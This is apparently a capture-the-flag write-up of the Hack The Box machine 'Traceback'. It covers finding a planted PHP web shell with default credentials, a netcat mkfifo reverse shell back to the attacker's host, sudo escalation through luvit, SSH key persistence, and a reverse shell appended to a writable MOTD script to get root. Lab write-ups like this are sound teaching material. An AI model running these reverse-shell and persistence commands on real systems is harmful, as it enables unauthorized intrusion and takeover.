# Traceback

## Nmap

```
sudo nmap 10.10.10.181 -p- -sS -sV           

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Jumping straight into port 80 we are presented with the page below:

![http://10.10.10.181/](<../../../.gitbook/assets/image (1619).png>)

Viewing the source for this web page shows the hacker has left a hint 'Some of the best web shells that you might need ;)'.

![view-source:http://10.10.10.181/](<../../../.gitbook/assets/image (1620).png>)

From here I executed dirsearch.py with the CommonBackdoors-PHP.fuzz.txt wordlist from seclists which can be found here: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists).

```
sudo python3 dirsearch.py -u http://10.10.10.181 -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt --full-url -t 75 
```

![](<../../../.gitbook/assets/image (1621).png>)

dirsearch.py finds smevk.php from the wordlist. Browsing to the PHP webshell shows the following below:

![http://10.10.10.181/smevk.php](<../../../.gitbook/assets/image (1622) (1).png>)

Looking up the credentials for the SmEvK web shell we get the following GitHub link:[https://github.com/TheBinitGhimire/Web-Shells/blob/master/PHP/smevk.php](https://github.com/TheBinitGhimire/Web-Shells/blob/master/PHP/smevk.php)

This shows that the defaults are `admin:admin`

![](<../../../.gitbook/assets/image (1624).png>)

Once logged in we get the page below:

![http://10.10.10.181/smevk.php](<../../../.gitbook/assets/image (1625) (1).png>)

Heading over to the 'console' tab we see that when running `which nc` that `netcat` is installed. I set up a local listener on my attacking machine.

```
sudo nc -lvp 80
```

Then executed the following command on the web shell to gain a full reverse shell.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.29 80 >/tmp/f
```

![](<../../../.gitbook/assets/image (1626).png>)

Checking the users in `/home/` we have sysadmin and webadmin. The user webadmin has a note.txt file in their desktop.

![](<../../../.gitbook/assets/image (1627).png>)

Following this I was unable to find the tool which was mentioned. I then checked sudo privileges with `sudo -l` and took note that we can run `sudo` as the user sysadmin without specifying a password on the path `/home/sysadmin/luvit`.

![](<../../../.gitbook/assets/image (1628).png>)

Running the following command allows us to start the binary but seems to throw an exception and kick us out immediately.

```
sudo -u sysadmin /home/sysadmin/luvit
```

![](<../../../.gitbook/assets/image (1629).png>)

Looking up LUA on [GTFOBins](https://gtfobins.github.io/gtfobins/lua/) shows we may be able to spawn a system shell with the privileges of the executing user.

![](<../../../.gitbook/assets/image (1630).png>)

Using this I run the following command replacing 'lua' with 'luvit'.

```
sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
```

![](<../../../.gitbook/assets/image (1632) (1).png>)

Which in turn gives us a shell as the user 'sysadmin'. Next use the following command to upgrade the shell.

```
/usr/bin/script -qc /bin/bash /dev/null
```

From here I opted to gain `SSH` access. As we do not know the password of the sysadmin user I will instead drop my attacking machines id\_rsa.pub contents into `/home/sysadmin/.ssh/authorized_keys` file.

If you do not have a `id_rsa.pub` file on the attacking machine run the following command and hit enter on all options.

```
ssh-keygen -t rsa
```

![](<../../../.gitbook/assets/image (1633).png>)

Then cat the contents of `id_rsa.pub`.

![](<../../../.gitbook/assets/image (1634).png>)

Then echo in the `authorized_keys` file on the target machine.

![](<../../../.gitbook/assets/image (1635).png>)

We can then log into `SSH` as the user sysadmin.

![](<../../../.gitbook/assets/image (1636).png>)

We also see the hacker has altered the MOTD banner when logging in. We can check the permissions of this in `/etc/updatemotd.d/`.

![](<../../../.gitbook/assets/image (1637).png>)

As we have write permissions over these files I will simply inject a `netcat` reverse shell into the first script run which is 00-header.

Set a `netcat` listener on the attacking machine then run the following command on the target machine:

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.29 80 >/tmp/f' >> 00-header
```

Once completed log out of `SSH` and back in to execute. The login should hang and fail to complete.

![](<../../../.gitbook/assets/image (1638).png>)

Resulting in a root shell on the `netcat` listener.

![](<../../../.gitbook/assets/image (1639).png>)
